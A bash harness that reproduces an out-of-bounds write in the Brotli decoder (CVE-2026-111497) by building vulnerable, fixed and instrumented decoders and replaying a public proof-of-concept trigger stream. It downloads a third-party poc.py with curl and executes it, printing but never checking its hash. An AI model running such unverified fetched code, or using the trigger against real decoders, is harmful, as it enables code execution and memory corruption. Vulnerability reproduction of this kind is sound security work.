#!/usr/bin/env bash
# Loopback/file-only reproduction for CVE-2026-111497 (Brotli decoder block-switch
# over-write). Builds vulnerable v1.2.0 and fixed v1.2.1 standalone decoder
# harnesses, replays the pinned two-stage public PoC stream, and records the
# differential plus an instrumented observation of the out-of-bounds writes.
# No network probe: all inputs are local files; the only fetch is provisioning
# of the public PoC generator and upstream source (allow under standing rules).
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"
mkdir -p logs build-v1.2.0 build-v1.2.1 build-instr

POC_URL='https://raw.githubusercontent.com/dimasma0305/CVE-2026-111497-POC/main/poc.py'
POC_SHA='3f6d79b00daf87e0ff69914ef25dc3331afd5ef319b261bd8fdc2403a24a3d9d'
TRIGGER_SHA='b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4'
V120='028fb5a23661f123017c060daa546b55cf4bde29'
V121='db24a98aed38a16de78cc05ca15cdd8dc2a0d92d'

echo "== provisioning =="
if [ ! -f poc.py ]; then curl -sS --max-time 30 -o poc.py "$POC_URL"; fi
echo "$(sha256sum poc.py)  expected $POC_SHA"
if [ ! -d brotli-src/.git ]; then
  git clone --quiet https://github.com/google/brotli.git brotli-src
fi

python3 - <<'PY'
import sys, hashlib, pathlib
sys.path.insert(0, '.')
import poc
t = poc.generate_stream()
assert hashlib.sha256(t).hexdigest() == poc.TRIGGER_SHA256, 'trigger hash mismatch'
pathlib.Path('trigger.br').write_bytes(t)
a, b = poc.trigger_stages()
pathlib.Path('stage1.br').write_bytes(a)
pathlib.Path('stage2.bin').write_bytes(b)
print('generated trigger.br, stage1.br, stage2.bin')
PY

build() {  # src tag outdir [patch]
  local src="$1" tag="$2" out="$3" patch="${4:-}"
  ( cd "$src" && git checkout --quiet "$tag" )
  if [ -n "$patch" ]; then ( cd "$src" && patch -p1 --forward --silent < "$HERE/$patch" ); fi
  local inc="-I$HERE/$src/c/include -I$HERE/$src/c/dec -I$HERE/$src/c/common"
  # shellcheck disable=SC2086
  clang $inc -g -O1 -Wall "$HERE/decoder_harness_2stage.c" \
    "$HERE/$src"/c/dec/*.c "$HERE/$src"/c/common/*.c -lm -o "$HERE/$out/decoder_harness_2stage"
  if [ -n "$patch" ]; then ( cd "$src" && git checkout --quiet -- . ); fi
}

echo "== building harnesses =="
build brotli-src "$V120" build-v1.2.0
build brotli-src "$V121" build-v1.2.1
build brotli-src "$V120" build-instr oob-guard.patch

echo "== rung 1/2: vulnerable v1.2.0 two-stage differential =="
timeout 90s ./build-v1.2.0/decoder_harness_2stage stage1.br stage2.bin 200000 \
  > logs/v120-2stage.out 2>&1; echo "v1.2.0 shell_rc=$?" >> logs/v120-2stage.out
echo "== rung 1/2: fixed v1.2.1 control =="
timeout 90s ./build-v1.2.1/decoder_harness_2stage stage1.br stage2.bin 200000 \
  > logs/v121-2stage.out 2>&1; echo "v1.2.1 shell_rc=$?" >> logs/v121-2stage.out
echo "== rung 3: instrumented OOB observation =="
timeout 90s ./build-instr/decoder_harness_2stage stage1.br stage2.bin 200000 \
  > logs/instr-2stage.out 2>&1; echo "instr shell_rc=$?" >> logs/instr-2stage.out

echo "== results =="
echo "-- v1.2.0 (vulnerable) --"; tail -5 logs/v120-2stage.out
echo "-- v1.2.1 (fixed) --"; tail -5 logs/v121-2stage.out
echo "-- instrumented OOB writes --"; grep -c 'OOB' logs/instr-2stage.out; grep 'OOB' logs/instr-2stage.out | head -20
echo "== pinned digests =="
sha256sum poc.py trigger.br stage1.br stage2.bin
